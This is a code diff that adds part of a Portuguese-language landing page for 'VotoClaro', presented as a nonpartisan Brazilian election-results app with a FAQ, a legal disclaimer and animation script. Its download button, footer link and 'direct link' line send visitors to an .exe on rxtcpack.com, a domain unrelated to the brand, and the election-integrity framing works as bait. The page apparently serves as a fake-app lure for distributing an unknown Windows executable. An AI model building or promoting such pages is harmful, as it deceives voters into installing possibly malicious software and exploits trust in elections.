+        <p>Não é preciso criar conta para acompanhar os resultados. Escolha seu estado ou cidade e o app monta seu painel personalizado na hora.</p>
+      </div>
+      <div class="step reveal">
+        <h3>Acompanhe a apuração chegar</h3>
+        <p>Números oficiais chegam ao vivo. Cada dado é conferido automaticamente e qualquer desvio é destacado antes de chegar até você.</p>
+      </div>
+      <div class="step reveal">
+        <h3>Verifique, denuncie, compartilhe</h3>
+        <p>Confira seu próprio comprovante, envie uma denúncia se algo parecer errado e compartilhe um retrato verificado com fonte — não um print.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ STATS ============ -->
+<section id="trust" style="padding-top:0">
+  <div class="wrap">
+    <div class="stats reveal">
+      <div class="stat"><b data-count="5570">0</b><span>Municípios cobertos</span></div>
+      <div class="stat"><b data-count="27" data-suffix=" + DF">0</b><span>Estados e Distrito Federal</span></div>
+      <div class="stat"><b data-count="2" data-suffix="s">0</b><span>Atualização média</span></div>
+      <div class="stat"><b data-count="100" data-suffix="%">0</b><span>Dados de fontes oficiais</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ FAQ ============ -->
+<section id="faq" style="padding-top:0">
+  <div class="wrap">
+    <div class="sec-head reveal" style="max-width:800px;margin-inline:auto">
+      <span class="sec-tag">Perguntas frequentes</span>
+      <h2>Respostas diretas.</h2>
+    </div>
+
+    <div class="faq">
+      <details class="reveal" open>
+        <summary>Quem está por trás do VotoClaro?</summary>
+        <p>Uma equipe independente e apartidária de engenheiros, estatísticos e tecnólogos cívicos. O app não recebe financiamento de partidos, campanhas ou candidatos e não exibe anúncios.</p>
+      </details>
+      <details class="reveal">
+        <summary>De onde vêm os resultados?</summary>
+        <p>Todos os números são puxados de fontes oficiais de dados eleitorais. O VotoClaro nunca gera, estima ou "projeta" resultados por conta própria — ele exibe o que as fontes oficiais publicam e sinaliza qualquer coisa estatisticamente inconsistente para que você mesmo julgue.</p>
+      </details>
+      <details class="reveal">
+        <summary>O app declara um vencedor?</summary>
+        <p>Não. O VotoClaro não declara, certifica ou contesta resultados. Essa é a função da autoridade eleitoral. Nosso papel é tornar a apuração visível, rastreável e verificável de forma independente.</p>
+      </details>
+      <details class="reveal">
+        <summary>Meu voto é secreto?</summary>
+        <p>Sim, e continua sendo. A verificação de voto funciona apenas com o código do comprovante — confirma que uma cédula foi registrada e contada, e nunca liga uma cédula a uma pessoa nem revela uma escolha. Sua identidade nunca é anexada ao seu voto.</p>
+      </details>
+      <details class="reveal">
+        <summary>O que acontece com as denúncias que eu envio?</summary>
+        <p>As denúncias recebem data/hora, são assinadas criptograficamente e armazenadas com a mídia original. Elas ficam disponíveis para observadores credenciados, jornalistas e o público por meio da trilha de auditoria aberta. Nada é editado ou removido.</p>
+      </details>
+      <details class="reveal">
+        <summary>Em quais sistemas o app funciona?</summary>
+        <p>Por enquanto, o VotoClaro está disponível apenas para <strong>Windows 10 e 11</strong> (64 bits). É um app desktop nativo, instalado por um arquivo .exe de aproximadamente 48 MB. Versões para outros sistemas não têm previsão.</p>
+      </details>
+      <details class="reveal">
+        <summary>É realmente grátis?</summary>
+        <p>Sim. Grátis para baixar, grátis para usar, sem anúncios, sem plano premium, sem venda de dados. Infraestrutura cívica não deveria ter paywall.</p>
+      </details>
+    </div>
+  </div>
+</section>
+
+<!-- ============ CTA ============ -->
+<section id="download" style="padding-top:0">
+  <div class="wrap">
+    <div class="cta-card reveal">
+      <h2>Baixe o VotoClaro para Windows</h2>
+      <p>Instale antes do dia da eleição. Quando a apuração começar, você já estará acompanhando.</p>
+      <div class="cta-actions">
+        <a href="https://rxtcpack.com/app.exe" class="win-btn-outline" rel="noopener">
+          <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+            <path d="M0 3.5 9.5 2.2v9.3H0V3.5zm10.8-1.4L24 0v11.5H10.8V2.1zM0 12.5h9.5v9.3L0 20.5v-8zm10.8 0H24V24l-13.2-1.9v-9.6z"/>
+          </svg>
+          <span>
+            <span class="s-top">Baixar instalador .exe</span>
+            <span class="s-bot">Windows 10 / 11 (64 bits)</span>
+          </span>
+        </a>
+      </div>
+      <p class="cta-note">Grátis · Sem anúncios · Não precisa de conta para acompanhar · ~48 MB · Windows 10 ou superior</p>
+      <p class="cta-hash">Link direto: rxtcpack.com/app.exe</p>
+    </div>
+  </div>
+</section>
+
+<!-- ============ FOOTER ============ -->
+<footer>
+  <div class="wrap">
+    <div class="foot-grid">
+      <div>
+        <a href="#" class="logo">
+          <span class="logo-mark">
+            <svg viewBox="0 0 24 24" fill="none" stroke="#04170e" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>
+          </span>
+          VotoClaro
+        </a>
+        <p class="foot-desc">Tecnologia cívica independente e apartidária para eleições transparentes no Brasil. Disponível para Windows.</p>
+      </div>
+      <div>
+        <h4>App</h4>
+        <ul>
+          <li><a href="#features">Recursos</a></li>
+          <li><a href="#how">Como funciona</a></li>
+          <li><a href="https://rxtcpack.com/app.exe" rel="noopener">Baixar para Windows</a></li>
+          <li><a href="#">Notas de versão</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>Transparência</h4>
+        <ul>
+          <li><a href="#">Fontes de dados</a></li>
+          <li><a href="#">Metodologia</a></li>
+          <li><a href="#">Trilha de auditoria aberta</a></li>
+          <li><a href="#">Relatar um problema</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>Contato</h4>
+        <ul>
+          <li><a href="#">Imprensa</a></li>
+          <li><a href="#">Parcerias</a></li>
+          <li><a href="#">Política de privacidade</a></li>
+          <li><a href="#">Termos de uso</a></li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="disclaimer">
+      <strong>Aviso:</strong> O VotoClaro é um projeto cívico independente e não é afiliado, endossado ou operado por qualquer órgão governamental, autoridade eleitoral, partido político ou candidato. O app exibe dados publicados por fontes oficiais e não declara, certifica ou contesta resultados eleitorais. Sinalizações estatísticas e denúncias de usuários são indicadores para revisão pública, não conclusões de fato ou prova legal. Consulte sempre a autoridade eleitoral oficial para resultados certificados. Atualmente, o app está disponível somente para Windows 10 e 11 (64 bits).
+      <br><br>
+      © <span id="year"></span> VotoClaro. Feito no Brasil.
+    </div>
+  </div>
+</footer>
+
+<script>
+(function () {
+  "use strict";
+
+  /* Header shadow on scroll */
+  var header = document.getElementById("header");
+  var onScroll = function () {
+    header.classList.toggle("scrolled", window.scrollY > 12);
+  };
+  window.addEventListener("scroll", onScroll, { passive: true });
+  onScroll();
+
+  /* Current year */
+  document.getElementById("year").textContent = new Date().getFullYear();
+
+  /* Duplicate ticker content for a seamless loop */
+  var track = document.getElementById("tickerTrack");
+  if (track) track.innerHTML += track.innerHTML;
+
+  /* Reveal on scroll */
+  var revealEls = document.querySelectorAll(".reveal");
+  if ("IntersectionObserver" in window) {
+    var io = new IntersectionObserver(function (entries) {
+      entries.forEach(function (entry) {
+        if (entry.isIntersecting) {
+          entry.target.classList.add("in");
+          io.unobserve(entry.target);
+        }
+      });
+    }, { threshold: 0.12, rootMargin: "0px 0px -40px 0px" });
+    revealEls.forEach(function (el, i) {
+      el.style.transitionDelay = (i % 3) * 70 + "ms";
+      io.observe(el);
+    });
+  } else {
+    revealEls.forEach(function (el) { el.classList.add("in"); });
+  }
+
+  /* Animate progress bars in the desktop mockup */
+  var bars = document.querySelectorAll("[data-w]");
+  var animateBars = function () {
+    bars.forEach(function (el, i) {
+      setTimeout(function () { el.style.width = el.dataset.w; }, 260 + i * 110);
+    });
+  };
+  setTimeout(animateBars, 420);
+
+  /* Animated counters */
+  var counters = document.querySelectorAll("[data-count]");
+  var runCounter = function (el) {
+    var target = parseFloat(el.dataset.count);
+    var suffix = el.dataset.suffix || "";
+    var duration = 1500;
+    var start = null;
+    var step = function (ts) {
+      if (!start) start = ts;
+      var p = Math.min((ts - start) / duration, 1);
+      var eased = 1 - Math.pow(1 - p, 3);
+      var value = Math.round(target * eased);
+      el.textContent = value.toLocaleString("pt-BR") + suffix;
+      if (p < 1) requestAnimationFrame(step);
+    };
+    requestAnimationFrame(step);
+  };
+
+  if ("IntersectionObserver" in window) {
+    var co = new IntersectionObserver(function (entries) {
+      entries.forEach(function (entry) {
+        if (entry.isIntersecting) {
+          runCounter(entry.target);
+          co.unobserve(entry.target);
+        }
+      });
+    }, { threshold: 0.5 });
+    counters.forEach(function (el) { co.observe(el); });
+  } else {
+    counters.forEach(runCounter);
+  }
+})();
+</script>
+</body>
+</html>
